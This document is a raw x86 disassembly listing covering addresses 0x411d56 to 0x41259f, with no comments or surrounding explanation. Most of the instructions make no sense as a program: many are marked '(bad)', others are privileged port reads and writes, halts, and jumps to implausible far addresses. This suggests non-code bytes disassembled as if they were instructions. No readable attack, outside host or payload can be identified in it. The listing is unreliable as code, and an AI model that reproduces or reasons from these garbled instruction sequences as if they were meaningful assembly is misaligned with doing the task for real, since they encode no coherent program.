  411d56:	fiadd  WORD PTR [edi+0xa]
  411d59:	outs   dx,DWORD PTR ds:[esi]
  411d5a:	rol    BYTE PTR [esi+0xa],0xff
  411d5e:	stc    
  411d5f:	and    bl,BYTE PTR ss:[esi+0x500932eb]
  411d66:	rcl    WORD PTR [ecx],0x4f
  411d6a:	pop    esi
  411d6b:	ret    
  411d6c:	add    eax,0x92de968
  411d71:	add    cl,al
  411d73:	xor    al,BYTE PTR ds:0x745ae900
  411d79:	add    ch,cl
  411d7b:	xor    bh,dh
  411d7d:	mov    edi,0x44430bbd
  411d82:	sub    eax,0xe9000932
  411d87:	mov    ecx,0x88b9fbc4
  411d8c:	or     DWORD PTR [eax-0x15],ebp
  411d8f:	add    BYTE PTR [edi],bh
  411d91:	xchg   ebp,eax
  411d92:	test   DWORD PTR [ebx-0x128df5ce],0xb29ff51f
  411d9c:	cmc    
  411d9d:	or     DWORD PTR [ecx],ecx
  411d9f:	sub    DWORD PTR [esi+0x4a74feff],esp
  411da5:	and    al,BYTE PTR [esi+edi*8+0x19ea0b3d]
  411dac:	inc    esp
  411dad:	xchg   ebp,eax
  411dae:	test   ecx,0xcefef2b8
  411db4:	in     al,0x9
  411db6:	sub    BYTE PTR ds:0x35bd4442,ch
  411dbd:	or     DWORD PTR [eax],eax
  411dbf:	jmp    0x1a3ce273
  411dc4:	fwait
  411dc5:	or     DWORD PTR [eax-0x15],ebp
  411dc8:	xchg   ebp,eax
  411dc9:	lahf   
  411dca:	call   FWORD PTR [ebp-0x300fa40]
  411dd0:	sar    BYTE PTR [esi+0x4939e940],cl
  411dd6:	push   cs
  411dd7:	add    ah,dl
  411dd9:	popf   
  411dda:	(bad)  
  411ddb:	dec    DWORD PTR [eax-0x34]
  411dde:	inc    ebx
  411ddf:	fsubr  DWORD PTR [eax+0x5]
  411de2:	add    BYTE PTR [eax],al
  411de4:	xlat   BYTE PTR ds:[ebx]
  411de5:	enter  0x1d9,0x18
  411de9:	or     eax,0x8fbff00
  411dee:	pop    DWORD PTR [ebp+0x68]
  411df1:	push   ds
  411df2:	jb     0x411dfc
  411df4:	add    BYTE PTR [edi-0x38],ch
  411df7:	loope  0x411dc0
  411df9:	aad    0x34
  411dfb:	std    
  411dfc:	dec    DWORD PTR [eax]
  411dfe:	or     eax,0xd6c45c5
  411e03:	add    BYTE PTR [eax],al
  411e05:	fadd   DWORD PTR [ebp+0x44]
  411e08:	lock fmul DWORD PTR [eax+eax*1]
  411e0c:	add    BYTE PTR [edi],dl
  411e0e:	enter  0xf1,0xc8
  411e12:	or     al,0x0
  411e14:	lea    edx,[ebp+0x45ff4d44]
  411e1a:	and    ch,ah
  411e1c:	in     eax,0xcb
  411e1e:	or     al,0x0
  411e20:	or     ecx,DWORD PTR [eax]
  411e22:	cdq    
  411e23:	adc    eax,0xfd181d83
  411e28:	jae    0x411dcb
  411e2a:	sbb    eax,0x70ff474
  411e2f:	ror    BYTE PTR [eax+0x49],1
  411e32:	or     eax,0xbc445c5
  411e37:	add    BYTE PTR [eax],al
  411e39:	cwde   
  411e3a:	xor    DWORD PTR [esi],eax
  411e3c:	(bad)  
  411e3d:	push   ebp
  411e3e:	cmp    ebp,edi
  411e40:	dec    DWORD PTR [eax-0x638a02f4]
  411e46:	sbb    eax,0xcc239414
  411e4b:	std    
  411e4c:	or     cl,BYTE PTR [eax+0x31e81b98]
  411e52:	aam    0x1a
  411e54:	dec    BYTE PTR [esi+0x73]
  411e57:	(bad)  
  411e58:	mov    eax,DWORD PTR [eax]
  411e5a:	cli    
  411e5b:	xor    BYTE PTR [eax+eax*1],al
  411e5e:	vunpcklps ymm2,ymm2,YMMWORD PTR [eiz*4-0x8003ed5]
  411e67:	in     al,dx
  411e68:	das    
  411e69:	inc    edi
  411e6a:	jo     0x411e5e
  411e6c:	add    al,BYTE PTR [eax]
  411e6e:	xor    DWORD PTR [edx-0x80],esi
  411e71:	jl     0x411e70
  411e73:	icebp  
  411e74:	lea    ecx,[edx]
  411e76:	push   cs
  411e77:	fisttp QWORD PTR ds:0x294e7cfe
  411e7d:	mov    esi,DWORD PTR [edx]
  411e7f:	repnz add edi,edi
  411e82:	jl     0x411ec2
  411e84:	sub    DWORD PTR [ebx+0x30],esi
  411e87:	repnz add esp,edi
  411e8a:	and    dh,BYTE PTR [edx]
  411e8c:	pop    edx
  411e8d:	(bad)  
  411e8e:	fisub  WORD PTR [esi]
  411e90:	adc    al,0xf1
  411e92:	xchg   ecx,ebx
  411e94:	cld    
  411e95:	push   cs
  411e96:	mov    ah,0xd3
  411e98:	adc    al,0xfe
  411e9a:	(bad)  
  411e9b:	jp     0x411e95
  411e9d:	or     bl,dl
  411e9f:	idiv   BYTE PTR [esi+0x66]
  411ea2:	mov    bh,0xfe
  411ea4:	adc    DWORD PTR [edi+0x1f230],esi
  411eaa:	push   es
  411eab:	dec    ebx
  411eac:	cmp    eax,edx
  411eae:	add    al,0x7b
  411eb0:	and    BYTE PTR [edx+0x57b4dd6d],al
  411eb6:	sbb    DWORD PTR ds:0xca314104,eax
  411ebc:	xchg   esi,eax
  411ebd:	add    BYTE PTR [eax],al
  411ebf:	jb     0x411e87
  411ec1:	sahf   
  411ec2:	dec    DWORD PTR [esi+0x31000671]
  411ec8:	retf   0x20d2
  411ecb:	data16 or BYTE PTR [esi-0x6102a2e4],ah
  411ed2:	adc    ecx,DWORD PTR [esi-0x2a]
  411ed5:	into   
  411ed6:	adc    cl,BYTE PTR [edi-0x10]
  411ed9:	(bad)  
  411eda:	jmp    0x411f23
  411edc:	pop    es
  411edd:	repz inc ebx
  411edf:	ret    0x8f1b
  411ee2:	sub    eax,0xff77080e
  411ee7:	out    dx,al
  411ee8:	jge    0x411ecb
  411eea:	dec    edx
  411eeb:	sub    eax,0x1ec4b494
  411ef0:	or     ah,bh
  411ef2:	add    esi,DWORD PTR [ecx]
  411ef4:	jno    0x411ede
  411ef6:	add    al,0x31
  411ef8:	or     DWORD PTR [edi],edi
  411efa:	ret    0x61c
  411efd:	inc    edi
  411efe:	addr16 hlt 
  411f00:	jp     0x411eaa
  411f02:	add    ebp,esi
  411f04:	dec    esp
  411f05:	xor    eax,DWORD PTR ds:0x80e70930
  411f0b:	ins    DWORD PTR es:[edi],dx
  411f0c:	add    eax,0xcf2512b8
  411f11:	call   0x3105:0x8feed6c4
  411f18:	or     edx,esp
  411f1a:	inc    ebx
  411f1b:	cmp    eax,0xf4d9061c
  411f20:	jp     0x411eca
  411f22:	add    eax,DWORD PTR [eax]
  411f24:	leave  
  411f25:	adc    al,0xdd
  411f27:	adc    ch,BYTE PTR [edi+0x2349e4ce]
  411f2d:	dec    eax
  411f2e:	out    0x3,eax
  411f30:	xor    DWORD PTR [ecx],ecx
  411f32:	out    0x1b,eax
  411f34:	hlt    
  411f35:	and    al,0xd6
  411f37:	adc    dl,BYTE PTR [esi-0x78ed0fbc]
  411f3d:	jno    0x411f5c
  411f3f:	retf   
  411f40:	icebp  
  411f41:	or     bh,cl
  411f43:	cmp    DWORD PTR [ebp+0x6],edi
  411f46:	add    DWORD PTR [esi+0x6253cb2d],esi
  411f4c:	inc    esi
  411f4d:	push   esi
  411f4e:	pop    eax
  411f4f:	adc    edi,esi
  411f51:	pop    es
  411f52:	aas    
  411f53:	jmp    0xaa409782
  411f58:	and    esi,DWORD PTR [eax+0x0]
  411f5b:	sub    ebp,0xeae90008
  411f61:	add    eax,0xd032e9fe
  411f66:	ret    0x32ed
  411f69:	pop    ecx
  411f6a:	pop    eax
  411f6b:	add    DWORD PTR [ebx+0x8],esp
  411f6e:	aas    
  411f6f:	jmp    0x2a40979e
  411f74:	inc    ebx
  411f75:	outs   dx,BYTE PTR ds:[esi]
  411f76:	mov    cl,0xeb
  411f78:	cmc    
  411f79:	add    eax,0x92d81e6
  411f7e:	add    BYTE PTR [ecx+0x10],dl
  411f81:	pop    es
  411f82:	(bad)  
  411f83:	sbb    dl,BYTE PTR ds:[ecx-0xd]
  411f87:	add    BYTE PTR ss:[ebx-0x12],al
  411f8b:	in     eax,dx
  411f8c:	ss inc ebx
  411f8e:	pop    es
  411f8f:	jmp    0xfe4849d4
  411f94:	push   0x1
  411f96:	xchg   ebp,eax
  411f97:	dec    ebx
  411f98:	test   al,0x32
  411f9a:	or     DWORD PTR [eax+esi*8-0x51],esi
  411f9e:	inc    esp
  411f9f:	mov    WORD PTR [edx+0x75fe05f5],?
  411fa5:	sub    BYTE PTR [esi],al
  411fa7:	adc    al,0x65
  411fa9:	out    dx,eax
  411faa:	dec    eax
  411fab:	add    BYTE PTR [esi],ah
  411fad:	cmp    ebx,ebx
  411faf:	dec    eax
  411fb0:	sub    BYTE PTR ds:0xb2e90008,dh
  411fb6:	in     eax,dx
  411fb7:	adc    eax,0xe90720d5
  411fbc:	repz aaa 
  411fbe:	pop    es
  411fbf:	inc    BYTE PTR [eax]
  411fc1:	retf   
  411fc2:	mov    esp,0xc7d6855
  411fc7:	aas    
  411fc8:	add    BYTE PTR [eax-0x683cff62],ah
  411fce:	and    al,0x35
  411fd0:	add    DWORD PTR [eax+0x9],ecx
  411fd3:	mov    bh,0x7
  411fd5:	dec    eax
  411fd6:	or     DWORD PTR [eax],eax
  411fd8:	xor    ecx,DWORD PTR [edx-0x5d7c0fe1]
  411fde:	or     eax,0xea30273
  411fe3:	jmp    0xfecac0d1
  411fe8:	jmp    DWORD PTR [edi+0xfa7225]
  411fee:	xchg   edi,eax
  411fef:	sbb    ah,BYTE PTR [edi+0x0]
  411ff2:	and    ah,0x0
  411ff5:	add    BYTE PTR [eax],cl
  411ff7:	inc    ebp
  411ff8:	(bad)  
  411ff9:	and    eax,0x4087d4
  411ffe:	ja     0x411fec
  412000:	dec    ebp
  412001:	or     ecx,0x9c25fd08
  412007:	xchg   DWORD PTR [eax+0x0],eax
  41200a:	daa    
  41200b:	in     al,dx
  41200c:	push   ebp
  41200d:	sbb    DWORD PTR [ecx-0xbda02f8],0x37004087
  412017:	in     al,dx
  412018:	pop    ebp
  412019:	sbb    DWORD PTR [ecx-0x53da02f8],0x37004087
  412023:	in     al,dx
  412024:	or     DWORD PTR gs:[ecx-0x4bda02f8],0x97004087
  41202f:	jmp    0x41209e
  412031:	or     DWORD PTR [ecx+0xd],0x87fc25fd
  412038:	inc    eax
  412039:	add    BYTE PTR [ecx],dh
  41203b:	(bad)  
  41203d:	ja     0x411fef
  41203f:	xor    DWORD PTR [edi+edi*8],eax
  412042:	push   esp
  412043:	dec    esi
  412044:	add    DWORD PTR [eax+0x31],0xb07fe6c3
  41204b:	xor    DWORD PTR [edi+edi*8],eax
  41204e:	or     al,0x6e
  412050:	add    BYTE PTR [eax+0x0],0x31
  412054:	stos   DWORD PTR es:[edi],eax
  412055:	out    0x87,al
  412057:	mov    al,0x31
  412059:	add    al,0xff
  41205b:	adc    al,0x6e
  41205d:	add    BYTE PTR [eax+0x31],0x93
  412061:	out    0x8f,al
  412063:	mov    al,0x31
  412065:	add    al,0xff
  412067:	or     al,0x5e
  412069:	add    BYTE PTR [eax+0x31],0x7b
  41206d:	out    0x97,al
  41206f:	mov    al,0x30
  412071:	add    al,0xff
  412073:	push   esp
  412074:	mov    es,WORD PTR [edx-0x199ccec0]
  41207a:	lahf   
  41207b:	mov    al,0xb0
  41207d:	add    edi,edi
  41207f:	dec    esp
  412080:	mov    es,WORD PTR [edx-0x19b4cec0]
  412086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412087:	mov    al,0xb0
  412089:	add    edi,edi
  41208b:	adc    al,0x8e
  41208d:	add    BYTE PTR [eax+0x31],0x33
  412091:	out    0xaf,al
  412093:	mov    al,0xb0
  412095:	add    edi,edi
  412097:	or     al,0x5e
  412099:	add    BYTE PTR [eax+0x31],0x1b
  41209d:	out    0xb7,al
  41209f:	mov    al,0xb0
  4120a1:	add    edi,edi
  4120a3:	adc    al,0x4e
  4120a5:	add    BYTE PTR [eax+0x31],0x3
  4120a9:	in     al,0xbf
  4120ab:	mov    al,0xb0
  4120ad:	add    edi,edi
  4120af:	dec    esp
  4120b0:	add    BYTE PTR cs:[eax+0x31],0x9
  4120b5:	out    0xe9,al
  4120b7:	add    BYTE PTR [esi-0x77],ch
  4120ba:	sub    BYTE PTR [esi+ecx*4],al
  4120bd:	sub    eax,0x8f185a3
  4120c2:	into   
  4120c3:	jmp    0x469aa36
  4120c8:	jbe    0x4120f7
  4120ca:	xchg   ebx,eax
  4120cb:	test   ecx,esi
  4120cd:	or     BYTE PTR [esi+0x28897ee9],dh
  4120d3:	add    al,0x5e
  4120d5:	sub    eax,0x8f185c3
  4120da:	sahf   
  4120db:	jmp    0x469aa4e
  4120e0:	inc    esi
  4120e1:	sub    eax,0x8f18583
  4120e6:	xchg   cl,ch
  4120e8:	dec    esi
  4120e9:	mov    DWORD PTR [eax],ebp
  4120eb:	add    al,0x2e
  4120ed:	sub    eax,0x9718583
  4120f2:	outs   dx,BYTE PTR ds:[esi]
  4120f3:	jmp    0x3e9aa06
  4120f8:	push   ss
  4120f9:	sub    eax,0x9718553
  4120fe:	push   esi
  4120ff:	jmp    0x3e9aa02
  412104:	(bad)  
  412105:	sub    al,0x43
  412107:	test   DWORD PTR [ecx+0x9],esi
  41210a:	ds jmp 0x3e9a9fe
  412110:	out    0x2c,al
  412112:	jecxz  0x412095
  412114:	jno    0x41211f
  412116:	es jmp 0x3e9a84a
  41211c:	add    dh,cl
  41211e:	sub    al,0xe3
  412120:	xor    DWORD PTR [ecx+0x9],0x872ee90e
  412127:	test   al,0x3
  412129:	mov    dh,0x2c
  41212b:	rol    DWORD PTR [ecx-0x9fff70f],cl
  412131:	cdq    
  412132:	sbb    al,BYTE PTR [edx+0x240232a8]
  412138:	or     DWORD PTR [ebx-0x6621ffb7],esi
  41213e:	sub    BYTE PTR es:[eax],0x2d
  412142:	add    ah,BYTE PTR [ecx+eax*1]
  412145:	mov    bl,0x49
  412147:	add    dh,al
  412149:	mov    DWORD PTR [esi],ebp
  41214b:	sub    BYTE PTR [eax],0x35
  41214e:	add    ah,BYTE PTR [ecx+edi*8]
  412151:	mov    al,0x49
  412153:	add    BYTE PTR [esi+0x28823649],ch
  412159:	sub    eax,0xb0dd2402
  41215e:	dec    ecx
  41215f:	add    BYTE PTR [esi+0x28824659],dl
  412165:	xor    eax,0xb3312402
  41216a:	dec    ecx
  41216b:	add    BYTE PTR [esi+0x19],bh
  41216e:	dec    esi
  41216f:	sub    BYTE PTR [eax],0x2d
  412172:	add    ah,BYTE PTR [ecx+ebx*1]
  412175:	mov    bl,0x48
  412177:	add    BYTE PTR [esi+0x9],ah
  41217a:	push   esi
  41217b:	sub    BYTE PTR [eax-0x4edbfdce],0x0
  412182:	mov    al,0x48
  412184:	add    BYTE PTR [esi+0x9],cl
  412187:	pop    esi
  412188:	sub    BYTE PTR [eax-0x36dbfdce],0xb0
  41218f:	dec    eax
  412190:	add    BYTE PTR [esi],dh
  412192:	fldenv [ebp-0x7e]
  412195:	test   al,0x32
  412197:	add    ah,BYTE PTR [ecx+edx*4]
  41219a:	mov    al,0x48
  41219c:	add    BYTE PTR [esi],bl
  41219e:	fldcw  WORD PTR [ebp-0x7e]
  4121a1:	test   al,0x32
  4121a3:	add    ah,BYTE PTR [edx*4+0x48b0]
  4121aa:	das    
  4121ab:	icebp  
  4121ac:	jns    0x412130
  4121ae:	fld    DWORD PTR ds:0x881825fd
  4121b4:	inc    eax
  4121b5:	add    BYTE PTR [edi+0x498285e9],cl
  4121bb:	or     eax,0x871c25fd
  4121c0:	inc    eax
  4121c1:	add    BYTE PTR [edi-0x17],bl
  4121c4:	lea    eax,[edx+0x25fd0d49]
  4121ca:	aam    0x86
  4121cc:	inc    eax
  4121cd:	add    BYTE PTR [edi+0x198295e9],ch
  4121d3:	or     eax,0x86ec25fd
  4121d8:	inc    eax
  4121d9:	add    BYTE PTR [edi+0x1982a1e9],cl
  4121df:	or     eax,0x86f025fd
  4121e4:	inc    eax
  4121e5:	add    BYTE PTR [eax],al
  4121e7:	scas   eax,DWORD PTR es:[edi]
  4121e8:	jmp    0xd4aa496
  4121ed:	std    
  4121ee:	and    eax,0x408b68
  4121f3:	lahf   
  4121f4:	call   0x58aa4aa
  4121f9:	std    
  4121fa:	and    eax,0x408bd0
  4121ff:	outs   dx,DWORD PTR ds:[esi]
  412200:	call   0xd1aa4be
  412205:	std    
  412206:	and    eax,0x408b48
  41220b:	outs   dx,DWORD PTR ds:[esi]
  41220c:	call   0xcdaa4d2
  412211:	std    
  412212:	and    eax,0x408b10
  412217:	psubsb mm1,mm5
  41221a:	or     BYTE PTR [ecx+0x425fd0c],0x8b
  412221:	inc    eax
  412222:	add    BYTE PTR [ecx],dh
  412224:	imul   ecx,eax,0x23
  412227:	xor    eax,0x34010c73
  41222c:	cli    
  41222d:	dec    ecx
  41222e:	arpl   WORD PTR [ecx],si
  412230:	repnz add edx,eax
  412233:	sub    eax,0x35f780f2
  412238:	ins    DWORD PTR es:[edi],dx
  412239:	stc    
  41223a:	mov    bh,0x33
  41223c:	repnz add DWORD PTR [eax],eax
  41223f:	jae    0x412227
  412241:	add    DWORD PTR [ebx+0x78eea89],eax
  412247:	mov    ecx,0x1e6
  41224c:	xor    DWORD PTR [ebp+eax*1-0xe354e00],esi
  412253:	jl     0x41228e
  412255:	jp     0x41225a
  412257:	add    BYTE PTR [ecx],dh
  412259:	repnz aas 
  41225b:	add    esi,DWORD PTR [ecx]
  41225d:	jae    0x412268
  41225f:	pop    ds
  412260:	int3   
  412261:	stc    
  412262:	dec    ecx
  412263:	pop    es
  412264:	xor    edx,esi
  412266:	add    edx,eax
  412268:	xor    eax,0xf1f780f2
  41226d:	add    al,0xfc
  41226f:	mov    bh,0x3b
  412271:	repnz add DWORD PTR [eax],eax
  412274:	repz in eax,dx
  412276:	add    DWORD PTR ds:0x1f1b1,edi
  41227c:	xchg   esp,eax
  41227d:	cli    
  41227e:	dec    ecx
  41227f:	or     esi,DWORD PTR [ecx]
  412281:	repnz add edx,eax
  412284:	sub    eax,0x31ffcef2
  412289:	repnz add DWORD PTR [ebp+0x29],edi
  41228d:	mov    bh,bl
  41228f:	(bad)  
  412290:	out    dx,al
  412291:	icebp  
  412292:	aas    
  412293:	add    esi,DWORD PTR [ecx]
  412295:	cmc    
  412296:	add    DWORD PTR [edx],eax
  412298:	xor    edx,esi
  41229a:	mov    es,WORD PTR [edi]
  41229c:	cdq    
  41229d:	or     bh,dh
  41229f:	add    esi,DWORD PTR [ecx]
  4122a1:	or     DWORD PTR [ecx],ebp
  4122a3:	pop    es
  4122a4:	xor    DWORD PTR [esi],edi
  4122a6:	out    0x7,eax
  4122a8:	xor    DWORD PTR [ecx],ecx
  4122aa:	mov    ebx,?
  4122ac:	jle    0x4122c8
  4122ae:	out    0x3,eax
  4122b0:	add    BYTE PTR [ecx],dh
  4122b2:	retf   
  4122b3:	jecxz  0x4122b8
  4122b5:	fs or  edi,ebx
  4122b8:	add    esi,DWORD PTR [ecx]
  4122ba:	jle    0x41229b
  4122bc:	dec    ebx
  4122bd:	inc    edx
  4122be:	or     edi,esp
  4122c0:	add    esi,DWORD PTR [ebx+0x4]
  4122c3:	out    0xc8,eax
  4122c5:	xchg   BYTE PTR [edi],cl
  4122c7:	out    0x3,eax
  4122c9:	cld    
  4122ca:	adc    BYTE PTR [edi-0x1800890e],cl
  4122d0:	inc    ebp
  4122d1:	xor    cl,BYTE PTR [ecx]
  4122d3:	cld    
  4122d4:	add    edx,DWORD PTR [ecx]
  4122d6:	or     edi,esp
  4122d8:	mov    BYTE PTR [esi],dh
  4122da:	ror    edi,0x3
  4122dd:	xor    DWORD PTR [ecx],ecx
  4122df:	test   eax,0xe73e3100
  4122e4:	ret    
  4122e5:	inc    esi
  4122e6:	call   DWORD PTR [esp+edi*8]
  4122e9:	xchg   BYTE PTR [edx],ah
  4122eb:	out    0x3,eax
  4122ed:	xor    ebx,ecx
  4122ef:	jmp    0x4122f4
  4122f1:	ins    BYTE PTR es:[edi],dx
  4122f2:	or     DWORD PTR [edi+0x4],esp
  4122f5:	xor    DWORD PTR [edi+ebx*8+0x4b],edi
  4122f9:	cmp    cl,BYTE PTR [ecx]
  4122fb:	out    0x3,eax
  4122fd:	repz add eax,0x3cf9d6e7
  412303:	out    0x3,eax
  412305:	xor    BYTE PTR [ecx],cl
  412307:	out    0x68,al
  412309:	icebp  
  41230a:	mov    WORD PTR [ebx+0x289214fc],ds
  412310:	inc    esi
  412311:	xor    cl,BYTE PTR [ecx]
  412313:	push   0xffffff85
  412315:	add    BYTE PTR [edx+0x5],cl
  412318:	add    cl,ch
  41231a:	xor    bh,dh
  41231c:	jae    0x4122ea
  41231e:	push   edi
  41231f:	mov    DWORD PTR [eax],edx
  412321:	in     eax,dx
  412322:	xor    cl,BYTE PTR [ecx]
  412324:	xchg   DWORD PTR [eax-0x2b],ebp
  412327:	or     al,BYTE PTR [eax]
  412329:	jmp    0xedc0eb20
  41232e:	mov    dh,0xfe
  412330:	std    
  412331:	icebp  
  412332:	xor    cl,BYTE PTR [ecx]
  412334:	add    BYTE PTR [eax-0x54],dh
  412337:	push   cs
  412338:	add    al,0xe9
  41233a:	xor    cl,BYTE PTR [edx-0x1693a84]
  412340:	mov    dh,BYTE PTR [eax-0x66]
  412343:	or     al,BYTE PTR [eax]
  412345:	jmp    0xe8cb3700
  41234a:	xor    al,0xc9
  41234c:	(bad)  
  41234d:	test   eax,0xedc208fa
  412352:	xor    bl,cl
  412354:	pop    ds
  412355:	stos   DWORD PTR es:[edi],eax
  412356:	data16 inc BYTE PTR [edx+0xa5668]
  41235d:	jmp    0x725c988d
  412362:	mov    ch,0xe
  412364:	add    al,0xe9
  412366:	xor    dl,BYTE PTR [eax-0x1c10e81]
  41236c:	std    
  41236d:	sub    edx,esi
  41236f:	mov    BYTE PTR [ebp*8-0x16f7f6ce],bl
  412376:	xor    cl,BYTE PTR [ecx]
  412378:	xchg   DWORD PTR [eax+0x0],ebp
  41237b:	and    cl,BYTE PTR [edx]
  41237d:	add    cl,ch
  41237f:	xchg   edi,eax
  412380:	xchg   ecx,eax
  412381:	sbb    ch,ch
  412383:	xor    cl,BYTE PTR [ecx]
  412385:	ror    BYTE PTR [eax],1
  412387:	outs   dx,BYTE PTR ds:[esi]
  412388:	mov    edi,DWORD PTR [edi-0xb]
  41238b:	(bad)  
  41238c:	std    
  41238d:	std    
  41238e:	dec    esi
  41238f:	mov    eax,ds:0x5900891c
  412394:	cli    
  412395:	add    DWORD PTR [eax],eax
  412397:	fdivr  DWORD PTR [eax+eax*4+0x18]
  41239b:	int3   
  41239c:	or     DWORD PTR [eax],eax
  41239e:	inc    eax
  41239f:	jne    0xa1927be
  4123a5:	or     BYTE PTR [eax],al
  4123a7:	fmul   DWORD PTR [ecx]
  4123a9:	xchg   DWORD PTR [ecx-0x20248],eax
  4123af:	push   ebx
  4123b0:	jge    0x4123c7
  4123b2:	add    al,0x98
  4123b4:	or     DWORD PTR [edx-0x4b665ff],ecx
  4123ba:	rcl    BYTE PTR [eax],0x5
  4123bd:	ror    DWORD PTR [ebx-0x74fe2234],0x4c
  4123c4:	jmp    0xb87f78ca
  4123c9:	xor    dh,dh
  4123cb:	adc    eax,0x608afdc2
  4123d0:	and    esi,0x1
  4123d3:	leave  
  4123d4:	sbb    al,0x43
  4123d6:	lea    edi,[eax+edi*4-0x7e]
  4123da:	clc    
  4123db:	dec    ecx
  4123dc:	cwde   
  4123dd:	in     eax,dx
  4123de:	add    DWORD PTR [eax],0xffffff96
  4123e1:	or     DWORD PTR [ebx-0x1f06801],edi
  4123e7:	lea    esp,ds:0xfb727202
  4123ed:	jnp    0x4123ed
  4123ef:	add    ecx,esi
  4123f1:	lock add DWORD PTR [eax],eax
  4123f4:	sbb    BYTE PTR [eax+ebx*1+0x1f5998b],cl
  4123fb:	add    BYTE PTR [eax],cl
  4123fd:	add    BYTE PTR [eax+0x90c18],0x40
  412404:	adc    DWORD PTR [eax+0x19],0x87091804
  41240b:	xor    DWORD PTR [ecx],0xf6fffe02
  412411:	adc    DWORD PTR [bx],0xf601f235
  412418:	repz icebp 
  41241a:	lea    ecx,[ecx]
  41241c:	stos   DWORD PTR es:[edi],eax
  41241d:	fiadd  DWORD PTR [ebx]
  41241f:	fcmovnbe st,st(7)
  412421:	das    
  412422:	jl     0x41243b
  412424:	(bad)  
  412426:	xor    DWORD PTR [edi],ebx
  412428:	xor    BYTE PTR [ecx-0x18],bl
  41242b:	add    esi,DWORD PTR [ecx]
  41242d:	repnz mov ds,WORD PTR [eax]
  412430:	stos   BYTE PTR es:[edi],al
  412431:	jno    0x412427
  412433:	add    esi,DWORD PTR [ecx]
  412435:	bnd jp 0x4123b8
  412438:	dec    ecx
  412439:	out    0x1,al
  41243b:	add    cl,dh
  41243d:	push   0xf22d1b49
  412442:	add    DWORD PTR [ecx-0x1fd5000],ecx
  412448:	inc    DWORD PTR [esi+0x35178277]
  41244e:	repnz add DWORD PTR [edx-0x2d30fe7],ecx
  412455:	jb     0x4123f8
  412457:	sbb    eax,DWORD PTR [edx+0x1779f157]
  41245d:	in     al,0x5f
  41245f:	lods   al,BYTE PTR ds:[esi]
  412460:	add    BYTE PTR [eax+0x4efffdce],cl
  412466:	sbb    eax,0x2b08ae9
  41246b:	(bad)  
  41246c:	(bad)  
  41246d:	imul   eax,DWORD PTR ds:[edx+0x1f22d17],0xe548b840
  412478:	add    esi,DWORD PTR [ecx]
  41247a:	bnd jp 0x4123fd
  41247d:	inc    ecx
  41247e:	out    dx,al
  41247f:	add    DWORD PTR [eax],eax
  412481:	stos   BYTE PTR es:[edi],al
  412482:	jo     0x41246d
  412484:	add    esi,DWORD PTR [ecx]
  412486:	or     edi,esp
  412488:	adc    eax,esi
  41248a:	or     ebx,edx
  41248c:	std    
  41248d:	test   al,0x18
  41248f:	jmp    0x600818c9
  412494:	repz fild DWORD PTR [esi]
  412497:	pop    ss
  412498:	jecxz  0x4124cb
  41249a:	mov    dl,0xdb
  41249c:	(bad)  
  41249d:	fdivp  st(3),st
  41249f:	mov    esp,0xd789abea
  4124a4:	dec    esi
  4124a6:	sti    
  4124a7:	jo     0x41242b
  4124a9:	add    BYTE PTR [esi],bl
  4124ab:	add    eax,0x927103e7
  4124b0:	push   eax
  4124b1:	out    0x32,eax
  4124b3:	or     edi,esp
  4124b5:	jp     0x412468
  4124b7:	sbb    bl,ch
  4124b9:	add    esi,DWORD PTR [ecx]
  4124bb:	nop
  4124bc:	jo     0x4124a9
  4124be:	xor    cl,BYTE PTR [ecx]
  4124c0:	out    0x33,eax
  4124c2:	push   ecx
  4124c3:	pop    esp
  4124c4:	lea    esp,[esi-0x4d18fb90]
  4124ca:	fisttp QWORD PTR [edi+0x532ee04b]
  4124d0:	sbb    al,BYTE PTR [edi+ebx*8-0x79]
  4124d4:	int3   
  4124d5:	mul    esp
  4124d7:	add    eax,0xfb66f784
  4124dc:	out    0x7a,eax
  4124de:	fisub  DWORD PTR [ebx+ebx*8]
  4124e1:	jp     0x412542
  4124e3:	das    
  4124e4:	mov    ah,0x79
  4124e6:	shl    BYTE PTR [edi+eiz*8],cl
  4124e9:	jns    0x412512
  4124eb:	test   edx,eax
  4124ed:	nop
  4124ee:	push   ds
  4124ef:	nop
  4124f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124f1:	jnp    0x41254f
  4124f3:	lea    esi,[edx+0x4]
  4124f6:	xor    DWORD PTR [ecx],ecx
  4124f8:	out    0xc9,eax
  4124fa:	dec    eax
  4124fb:	jne    0x4124e2
  4124fd:	mov    esp,0xa0008470
  412502:	shl    ah,0x81
  412505:	test   eax,0xdcc7860e
  41250a:	or     cl,BYTE PTR [eax+0x1b00ebc0]
  412510:	pop    es
  412511:	sub    DWORD PTR [ecx],0x6a4643f6
  412517:	leave  
  412518:	es sbb al,0xe8
  41251b:	ror    esp,0x5d
  41251e:	lahf   
  41251f:	mov    DWORD PTR [edi-0x3e],ebx
  412522:	in     eax,0x32
  412524:	mov    ss,WORD PTR [ebp+eax*1+0x31]
  412528:	push   esp
  412529:	push   esi
  41252a:	jb     0x412548
  41252c:	ret    
  41252d:	xchg   cl,dl
  41252f:	mov    esi,0x32e9fdfa
  412534:	or     DWORD PTR [eax],eax
  412536:	arpl   WORD PTR [ebx+0x26f6c786],bp
  41253c:	sub    bh,bh
  41253e:	call   0x75ca7775
  412543:	jbe    0x41255b
  412545:	sub    esi,0xa6037487
  41254b:	jg     0x412547
  41254d:	std    
  41254e:	jmp    0xae6aed4e
  412553:	add    al,BYTE PTR [eax+0x8]
  412556:	push   ebp
  412557:	stos   DWORD PTR es:[edi],eax
  412558:	dec    ebx
  412559:	inc    eax
  41255a:	ins    BYTE PTR es:[edi],dx
  41255b:	das    
  41255c:	jne    0x412554
  41255e:	push   0xffffffdc
  412560:	sbb    eax,0xfa32e904
  412565:	jae    0x412533
  412567:	retf   
  412568:	adc    DWORD PTR [eax],0xffffffed
  41256b:	xor    cl,BYTE PTR [ecx]
  41256d:	xchg   DWORD PTR [edi+0x4a],esp
  412570:	push   es
  412571:	add    cl,ch
  412573:	add    BYTE PTR [edx-0x3d],dh
  412576:	xchg   ch,ch
  412578:	cs cli 
  41257a:	std    
  41257b:	add    BYTE PTR [eax],ah
  41257d:	push   es
  41257e:	add    BYTE PTR [eax],al
  412580:	mov    eax,ds:0x8040d7c
  412585:	push   es
  412586:	mov    DWORD PTR [esi-0x20620],eax
  41258c:	dec    eax
  41258d:	out    0x8a,al
  41258f:	xchg   al,bh
  412591:	stc    
  412592:	std    
  412593:	call   DWORD PTR [edx-0x2f77a100]
  412599:	add    al,BYTE PTR [ebx+0x5d410]
  41259f:	pop    esi
